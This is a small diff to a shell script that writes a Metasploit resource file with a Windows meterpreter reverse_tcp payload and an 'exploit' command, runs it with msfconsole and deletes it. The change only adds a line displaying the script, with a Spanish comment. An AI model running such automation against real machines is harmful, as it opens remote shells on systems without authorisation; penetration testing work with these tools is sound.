@@ -91,6 +91,8 @@
 	echo "set payload windows/x86/meterpreter/reverse_tcp"	>> sploit.flo
 	echo "exploit" 											>> sploit.flo 
 #
+	more sploit.flo 	#Muestra en pantalla el escript que se va a ejecutar
+#
 	msfconsole -r sploit.flo
 	rm sploit.flo
 #
